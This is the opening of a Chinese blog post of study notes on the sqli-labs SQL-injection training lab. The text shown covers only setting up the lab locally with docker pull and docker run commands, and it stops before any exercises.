<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>sqli-labs学习记录 | the0n3</title>
    <meta name="generator" content="VuePress 1.9.9">
    <link rel="icon" href="/img/favicon.ico">
    <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
    <link rel="stylesheet" href="/codeStyle/styles/github-dark.min.css">
    <script src="/codeStyle/highlight.min.js"></script>
    <script>hljs.highlightAll();</script>
    <meta name="description" content="CTF学习过程记录、随写、分享">
    <meta name="keywords" content="ctf,web,php,sql注入,xss,文件上传,文件包含,反序列化,代码审计,ssti模板注入,命令执行,框架复现,漏洞复现,渗透测试,内网,域,提权,网络安全,安全工具,漏洞分析,安全博客">
    <meta name="author" content="the0n3">
    <meta name="theme-color" content="#11a8cd">
    <meta name="google-site-verification" content="2rTU4TJf9FGp-0dfoTNgDPqEaVmD1mMxR_aabNaQXnQ">
    
    <link rel="preload" href="/assets/css/0.styles.85d6a2bf.css" as="style"><link rel="preload" href="/assets/js/app.dd92e586.js" as="script"><link rel="preload" href="/assets/js/2.1b31a38c.js" as="script"><link rel="preload" href="/assets/js/25.ac3d5247.js" as="script"><link rel="prefetch" href="/assets/js/10.da3a9ecd.js"><link rel="prefetch" href="/assets/js/100.57c348e7.js"><link rel="prefetch" href="/assets/js/101.16fde8c2.js"><link rel="prefetch" href="/assets/js/102.2c293fc9.js"><link rel="prefetch" href="/assets/js/103.028ba4bb.js"><link rel="prefetch" href="/assets/js/104.d0fdc732.js"><link rel="prefetch" href="/assets/js/105.1491f031.js"><link rel="prefetch" href="/assets/js/106.4839f4c6.js"><link rel="prefetch" href="/assets/js/107.1fc63e34.js"><link rel="prefetch" href="/assets/js/108.d004b56a.js"><link rel="prefetch" href="/assets/js/109.bd135893.js"><link rel="prefetch" href="/assets/js/11.495f1ddd.js"><link rel="prefetch" href="/assets/js/110.cbffe834.js"><link rel="prefetch" href="/assets/js/111.e064ec0d.js"><link rel="prefetch" href="/assets/js/112.76db0263.js"><link rel="prefetch" href="/assets/js/113.e64fce0c.js"><link rel="prefetch" href="/assets/js/114.a9d762c1.js"><link rel="prefetch" href="/assets/js/115.d7f94e89.js"><link rel="prefetch" href="/assets/js/116.c51eadec.js"><link rel="prefetch" href="/assets/js/117.a0075e4a.js"><link rel="prefetch" href="/assets/js/118.e3b8277e.js"><link rel="prefetch" href="/assets/js/119.500d06d7.js"><link rel="prefetch" href="/assets/js/12.d33d3e1f.js"><link rel="prefetch" href="/assets/js/120.cd604e90.js"><link rel="prefetch" href="/assets/js/121.f82f0ca9.js"><link rel="prefetch" href="/assets/js/122.3da49069.js"><link rel="prefetch" href="/assets/js/123.35423cde.js"><link rel="prefetch" href="/assets/js/124.a6b9e1a3.js"><link rel="prefetch" href="/assets/js/125.9e5ceded.js"><link rel="prefetch" href="/assets/js/126.7de3f175.js"><link rel="prefetch" href="/assets/js/127.0ecc0fa5.js"><link rel="prefetch" href="/assets/js/128.2183e167.js"><link rel="prefetch" href="/assets/js/129.6c5d5940.js"><link rel="prefetch" href="/assets/js/13.a867320c.js"><link rel="prefetch" href="/assets/js/130.9c2477c6.js"><link rel="prefetch" href="/assets/js/131.73a9cff1.js"><link rel="prefetch" href="/assets/js/132.8d87afbf.js"><link rel="prefetch" href="/assets/js/133.ffdb55d1.js"><link rel="prefetch" href="/assets/js/134.de940b0c.js"><link rel="prefetch" href="/assets/js/135.be21968e.js"><link rel="prefetch" href="/assets/js/136.faa50c6a.js"><link rel="prefetch" href="/assets/js/137.0f7b166c.js"><link rel="prefetch" href="/assets/js/138.03c80654.js"><link rel="prefetch" href="/assets/js/139.afbcc371.js"><link rel="prefetch" href="/assets/js/14.9f7fdc54.js"><link rel="prefetch" href="/assets/js/140.c16094e1.js"><link rel="prefetch" href="/assets/js/141.43569204.js"><link rel="prefetch" href="/assets/js/142.74bc348b.js"><link rel="prefetch" href="/assets/js/143.65a3cbff.js"><link rel="prefetch" href="/assets/js/144.6a64a132.js"><link rel="prefetch" href="/assets/js/145.7102c1e7.js"><link rel="prefetch" href="/assets/js/146.a7733f4f.js"><link rel="prefetch" href="/assets/js/147.e22451da.js"><link rel="prefetch" href="/assets/js/148.18595ba0.js"><link rel="prefetch" href="/assets/js/149.86afe015.js"><link rel="prefetch" href="/assets/js/15.861a98f0.js"><link rel="prefetch" href="/assets/js/150.ccafb5c5.js"><link rel="prefetch" href="/assets/js/151.434cb23b.js"><link rel="prefetch" href="/assets/js/152.e7c539b4.js"><link rel="prefetch" href="/assets/js/153.1f75415b.js"><link rel="prefetch" href="/assets/js/154.28a39e24.js"><link rel="prefetch" href="/assets/js/155.5c273321.js"><link rel="prefetch" href="/assets/js/156.f37d3312.js"><link rel="prefetch" href="/assets/js/157.6bac791e.js"><link rel="prefetch" href="/assets/js/158.d897babc.js"><link rel="prefetch" href="/assets/js/159.da0d41da.js"><link rel="prefetch" href="/assets/js/16.cc74538d.js"><link rel="prefetch" href="/assets/js/160.a382a0ad.js"><link rel="prefetch" href="/assets/js/161.948f6b86.js"><link rel="prefetch" href="/assets/js/162.271a8c1e.js"><link rel="prefetch" href="/assets/js/163.ceb534f6.js"><link rel="prefetch" href="/assets/js/164.aa3bcb70.js"><link rel="prefetch" href="/assets/js/165.bdea775a.js"><link rel="prefetch" href="/assets/js/166.37bc50f4.js"><link rel="prefetch" href="/assets/js/167.a03f335f.js"><link rel="prefetch" href="/assets/js/168.1d5416d1.js"><link rel="prefetch" href="/assets/js/169.9349ade1.js"><link rel="prefetch" href="/assets/js/17.132fcbaf.js"><link rel="prefetch" href="/assets/js/170.b8ddb745.js"><link rel="prefetch" href="/assets/js/171.3ce54bf9.js"><link rel="prefetch" href="/assets/js/172.1d7eecb6.js"><link rel="prefetch" href="/assets/js/173.d456776b.js"><link rel="prefetch" href="/assets/js/174.97f2f383.js"><link rel="prefetch" href="/assets/js/175.439aaa63.js"><link rel="prefetch" href="/assets/js/176.106e4abd.js"><link rel="prefetch" href="/assets/js/177.af9f1ce0.js"><link rel="prefetch" href="/assets/js/178.a83b29ad.js"><link rel="prefetch" href="/assets/js/179.14469c12.js"><link rel="prefetch" href="/assets/js/18.0ae552af.js"><link rel="prefetch" href="/assets/js/180.b7dd16ea.js"><link rel="prefetch" href="/assets/js/181.6d4cb919.js"><link rel="prefetch" href="/assets/js/182.ff9ac8e7.js"><link rel="prefetch" href="/assets/js/183.2ca38a05.js"><link rel="prefetch" href="/assets/js/19.c48fa7c0.js"><link rel="prefetch" href="/assets/js/20.341ab73c.js"><link rel="prefetch" href="/assets/js/21.8ae77766.js"><link rel="prefetch" href="/assets/js/22.09205c94.js"><link rel="prefetch" href="/assets/js/23.36de4c19.js"><link rel="prefetch" href="/assets/js/24.dd0aa5e1.js"><link rel="prefetch" href="/assets/js/26.7738564c.js"><link rel="prefetch" href="/assets/js/27.06c0e63a.js"><link rel="prefetch" href="/assets/js/28.72b76320.js"><link rel="prefetch" href="/assets/js/29.9dfc301d.js"><link rel="prefetch" href="/assets/js/3.083d80a0.js"><link rel="prefetch" href="/assets/js/30.e1502224.js"><link rel="prefetch" href="/assets/js/31.bcb9d920.js"><link rel="prefetch" href="/assets/js/32.deb31de7.js"><link rel="prefetch" href="/assets/js/33.93be7d64.js"><link rel="prefetch" href="/assets/js/34.ea106cb2.js"><link rel="prefetch" href="/assets/js/35.e27abc54.js"><link rel="prefetch" href="/assets/js/36.2def90c4.js"><link rel="prefetch" href="/assets/js/37.c4c014e3.js"><link rel="prefetch" href="/assets/js/38.e9f556bb.js"><link rel="prefetch" href="/assets/js/39.0cd736a7.js"><link rel="prefetch" href="/assets/js/4.a9cdbd8d.js"><link rel="prefetch" href="/assets/js/40.db64bde6.js"><link rel="prefetch" href="/assets/js/41.959454ab.js"><link rel="prefetch" href="/assets/js/42.2ef35913.js"><link rel="prefetch" href="/assets/js/43.5782064b.js"><link rel="prefetch" href="/assets/js/44.28fbc620.js"><link rel="prefetch" href="/assets/js/45.07c74048.js"><link rel="prefetch" href="/assets/js/46.e3db42a8.js"><link rel="prefetch" href="/assets/js/47.f708ca13.js"><link rel="prefetch" href="/assets/js/48.83fa197b.js"><link rel="prefetch" href="/assets/js/49.75e0152e.js"><link rel="prefetch" href="/assets/js/5.60027e55.js"><link rel="prefetch" href="/assets/js/50.b130cab6.js"><link rel="prefetch" href="/assets/js/51.4493eeb9.js"><link rel="prefetch" href="/assets/js/52.990f9f85.js"><link rel="prefetch" href="/assets/js/53.3caee6b2.js"><link rel="prefetch" href="/assets/js/54.b8728406.js"><link rel="prefetch" href="/assets/js/55.05fcd335.js"><link rel="prefetch" href="/assets/js/56.d538cfd5.js"><link rel="prefetch" href="/assets/js/57.1797e62e.js"><link rel="prefetch" href="/assets/js/58.7a754248.js"><link rel="prefetch" href="/assets/js/59.ac591ef3.js"><link rel="prefetch" href="/assets/js/6.b505ba82.js"><link rel="prefetch" href="/assets/js/60.344183f9.js"><link rel="prefetch" href="/assets/js/61.461678cb.js"><link rel="prefetch" href="/assets/js/62.fcdfc4d4.js"><link rel="prefetch" href="/assets/js/63.09c0a2e1.js"><link rel="prefetch" href="/assets/js/64.e92534ba.js"><link rel="prefetch" href="/assets/js/65.001faa0c.js"><link rel="prefetch" href="/assets/js/66.a4d4feb6.js"><link rel="prefetch" href="/assets/js/67.febca055.js"><link rel="prefetch" href="/assets/js/68.2a1bc8d1.js"><link rel="prefetch" href="/assets/js/69.d5835fd4.js"><link rel="prefetch" href="/assets/js/7.a96ac55e.js"><link rel="prefetch" href="/assets/js/70.e7fe0ee2.js"><link rel="prefetch" href="/assets/js/71.9076c6ea.js"><link rel="prefetch" href="/assets/js/72.7c8bce2f.js"><link rel="prefetch" href="/assets/js/73.0fcb141d.js"><link rel="prefetch" href="/assets/js/74.d21b5253.js"><link rel="prefetch" href="/assets/js/75.2aa5b7a5.js"><link rel="prefetch" href="/assets/js/76.6953aff6.js"><link rel="prefetch" href="/assets/js/77.fb38e4ef.js"><link rel="prefetch" href="/assets/js/78.4297b26b.js"><link rel="prefetch" href="/assets/js/79.98963574.js"><link rel="prefetch" href="/assets/js/8.2fb73b4d.js"><link rel="prefetch" href="/assets/js/80.96395084.js"><link rel="prefetch" href="/assets/js/81.52655a9e.js"><link rel="prefetch" href="/assets/js/82.e75a1391.js"><link rel="prefetch" href="/assets/js/83.e8ec8344.js"><link rel="prefetch" href="/assets/js/84.565ea14c.js"><link rel="prefetch" href="/assets/js/85.5ca599e1.js"><link rel="prefetch" href="/assets/js/86.f4e6c370.js"><link rel="prefetch" href="/assets/js/87.af5486d5.js"><link rel="prefetch" href="/assets/js/88.3cdb32b4.js"><link rel="prefetch" href="/assets/js/89.8a9f6beb.js"><link rel="prefetch" href="/assets/js/9.d63216c2.js"><link rel="prefetch" href="/assets/js/90.f0933bd3.js"><link rel="prefetch" href="/assets/js/91.16af275a.js"><link rel="prefetch" href="/assets/js/92.03d856bb.js"><link rel="prefetch" href="/assets/js/93.030d2056.js"><link rel="prefetch" href="/assets/js/94.54ac6b9f.js"><link rel="prefetch" href="/assets/js/95.f8a3089a.js"><link rel="prefetch" href="/assets/js/96.eefdd475.js"><link rel="prefetch" href="/assets/js/97.9226ead2.js"><link rel="prefetch" href="/assets/js/98.5f4b97af.js"><link rel="prefetch" href="/assets/js/99.2a986525.js">
    <link rel="stylesheet" href="/assets/css/0.styles.85d6a2bf.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/logo.png" alt="the0n3" class="logo"> <span class="site-name can-hide">the0n3</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/archives/" class="nav-link">归档</a></div><div class="nav-item"><a href="/friends/" class="nav-link">友链</a></div><div class="nav-item"><a href="/pages/c52ab0/" class="nav-link">收藏</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="在线工具" class="dropdown-title"><a href="/pages/sqli-labs/#" class="link-title">在线工具</a> <span class="title" style="display:none;">在线工具</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://the0n3.top/tasklist/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  windows杀软在线对比
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/shell/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  反弹shell生成
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/rce/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  php无字母数字rce在线生成
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/nav/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  工具清单
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div><div class="nav-item"><a href="https://www.travellings.cn/go.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  开往
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <a href="https://github.com/Apursuit/Apursuit.github.io" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar-hover-trigger"></div> <aside class="sidebar" style="display:none;"><!----> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/archives/" class="nav-link">归档</a></div><div class="nav-item"><a href="/friends/" class="nav-link">友链</a></div><div class="nav-item"><a href="/pages/c52ab0/" class="nav-link">收藏</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="在线工具" class="dropdown-title"><a href="/pages/sqli-labs/#" class="link-title">在线工具</a> <span class="title" style="display:none;">在线工具</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://the0n3.top/tasklist/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  windows杀软在线对比
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/shell/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  反弹shell生成
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/rce/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  php无字母数字rce在线生成
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://the0n3.top/nav/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  工具清单
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div><div class="nav-item"><a href="https://www.travellings.cn/go.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  开往
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <a href="https://github.com/Apursuit/Apursuit.github.io" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><a href="/pages/a14a27/" class="sidebar-link">xyctf</a></li><li><a href="/pages/3dab5b/" class="sidebar-link">CTFSHOW web311-314 CVE-wtiteup</a></li><li><a href="/pages/06f28c/" class="sidebar-link">CTFshow 文件上传web151-170</a></li><li><a href="/pages/a11a87/" class="sidebar-link">CTFSHOW nodejs 334-338</a></li><li><a href="/pages/e9d443/" class="sidebar-link">ctfshow web sql注入171-253</a></li><li><a href="/pages/0aec60/" class="sidebar-link">pwnable</a></li><li><a href="/pages/a0e9c3/" class="sidebar-link">BaseCTF 2024 web部分wp</a></li><li><a href="/pages/969484/" class="sidebar-link">buu 部分flask题目</a></li><li><a href="/pages/113a46/" class="sidebar-link">MoeCTF 2024 wp</a></li><li><a href="/pages/24d392/" class="sidebar-link">buu一道简单java web</a></li><li><a href="/pages/286e6c/" class="sidebar-link">ctfshow RCE极限挑战</a></li><li><a href="/pages/a43171/" class="sidebar-link">ctfshow 常见姿势</a></li><li><a href="/pages/8a601d/" class="sidebar-link">buildCTF web wp</a></li><li><a href="/pages/e5ee7e/" class="sidebar-link">ctfshow单身杯</a></li><li><a href="/pages/c883f6/" class="sidebar-link">ctfshow-thinkphp专题</a></li><li><a href="/pages/a0b4dd/" class="sidebar-link">玄机-webshell查杀</a></li><li><a href="/pages/b93d32/" class="sidebar-link">蜀道山高校联合赛</a></li><li><a href="/pages/fff859/" class="sidebar-link">应急响应-linux日志分析</a></li><li><a href="/pages/0e353f/" class="sidebar-link">ciscn2023 web部分</a></li><li><a href="/pages/29c781/" class="sidebar-link">应急响应-linux入侵排查</a></li><li><a href="/pages/02e0b4/" class="sidebar-link">应急响应-apahce日志分析</a></li><li><a href="/pages/ggssrf/" class="sidebar-link">国光SSRF靶场打穿内网</a></li><li><a href="/pages/actf2025/" class="sidebar-link">ACTF2025 web部分题解</a></li><li><a href="/pages/ctfshow-websec/" class="sidebar-link">CTFshow web应用安全与防护 wp</a></li></ul> </aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-06225672><div class="articleInfo" data-v-06225672><ul class="breadcrumbs" data-v-06225672><li data-v-06225672><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-06225672></a></li> <li data-v-06225672><span data-v-06225672>wp</span></li></ul> <div class="info" data-v-06225672><div title="作者" class="author iconfont icon-touxiang" data-v-06225672><a href="https://the0n3.top" target="_blank" title="作者" class="beLink" data-v-06225672>the0n3</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-06225672><a href="javascript:;" data-v-06225672>2025-03-05</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-title">目录</div> <div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABH1JREFUSA3tVl1oHFUUPmdmd2ltklqbpJDiNnXFmgbFktho7YMPNiJSSZM0+CAYSkUELVhM6YuwIPpgoOKDqOBDC0XE2CQoNtQXBUFTTcCi+Wlh1V2TQExsUzcltd3M9Tt3ZjZzZ2fT+OJTL8yeM+eee757fmeJbq//KQL8X3DUSFOcfr7cRsRtxNQMWueeVzOkaITIGqQHNg5y8+jNW9ldM7A6nTpAjuolUikAwq7CE3WcM2RRDz+XGVgN3FptU/aUSlvq9Pa3iZ1+sgAqJyyAFqkipd9dqiwHF3P65YycLWc/6sqGrvoEoIp6DOFaX5h6+dnfjkWprwqsPk0dUGq5vySwDImC10KxFHgGL1SWoc92O3eVht09qdXNH11I2SsTsJYqMWzihqGMi+A+Garf3BAuuLI5oGlULyNfyB/HYNujwktOfRrMr5t77NmevqaUopx0grnKAyvVpmwUDB4x6FPXuGvYLTDwWsejwgtgkYKPqRJg8SV6xaiZ3ZTppGneS4yfH5/66fZSDHv+QZci/+h5c5UHtpy67JUqGppM0sh0Nc1dW6/N1W5Yoqat8/TU/VnadmdeW2PLLSyh0cvxBs3KbqTmwYPpxN4do/mzE8nEpvX/UMu2Wbp74zUAK5q6WkHns7V0eWkdPbPzd3rxkTGybadYySumVzhcaJFbs5UrEkQ/+CK8gF5dnh/6ciIZ73gwQ927L1IitoxKLXYP3SjYdOrHHfTZhRRlFyrorafPk20B3HPD1y2G3qKZME5Jcf3t/HUC13/8tSd++vqFveMUTwAUxSUFI1QekR1+bIze3D9MF2aq6cPvG72CgnldWCFqyRw3lwH8ZMerjTD9ElRO7Gv44wNpC90aASqGfVlz/Rx17srQ57/UU26hkhQqUB7dBR71WmzQhHUnblGmVOEw0jhbV1n9OlXUDCIRGaNV5Jp43N516fN7JmnTHdfp7Hgy0luO4aMhtkLL8Bi3bUWYvzh5Mn1dTxrL6QmGuRhGL/TiTTxRoEdTszSaq9GR0NGA3KdkOz3hqSV3MIDhQ5IVX/Ivx3umBti2es2h4eZby7x8br1rkf7Mo90AqC8aQ3sJeNzqFRu+vSANAQe3PL7l0HGOAdwDCeZYvNKeoZp1Qfs6Aipndh86HmFRi0LAnEO47wsqM6cdfjh3jBPUzhZy7nvlUfFsamED1VQt6aISHVymXZ/B2aCtIG8AI8xfobj2d3en1wWVhOeHELKmLQ1s211s88comkv4UCwWyF787mJdYXtNfhKAXVqnKTq8QZvGAGGOfaTo5pGZ/PwbUCr5+DPr/1J92JNHr9aOl/F3iI5+O1nfybsGxoimvZ3ViWSluDITw3P37mypheDIPY0tw7+O/5ApbkYw+zpfaUVu32Pi98+defdUhEpZkRFq0aqyNh9FuL9hpYbEm6iwi0z2REd09ZmyENEbuhjDWzKvZXTqKYaBIr3tt5kuPtQBZFvEUwHt60vfCNu41XsksH9Ij1BMMz1Y0OOunHNShFIP5868g5zeXmuLwL9T4b6Q2+KejgAAAABJRU5ErkJggg==">sqli-labs学习记录<!----></h1>  <div class="theme-vdoing-content content__default"><p>有时间就要学习</p> <p><img src="/medias/sqli-labs/1.png" alt="1"></p> <div class="custom-block tip"><p class="custom-block-title">提示</p> <p>学习过程阅读题目源码，方便理解漏洞的成因</p></div> <h2 id="环境搭建"><a href="#环境搭建" class="header-anchor">#</a> 环境搭建</h2> <p>使用docker部署，简单方便一些，即开即用</p> <p>映射到主机8080端口</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">docker</span> pull acgpiano/sqli-labs
<span class="token function">docker</span> run <span class="token parameter variable">-dt</span> <span class="token parameter variable">--name</span> sqli-lab <span class="token parameter variable">-p</span> <span class="token number">8080</span>:80 acgpiano/sqli-labs:latest
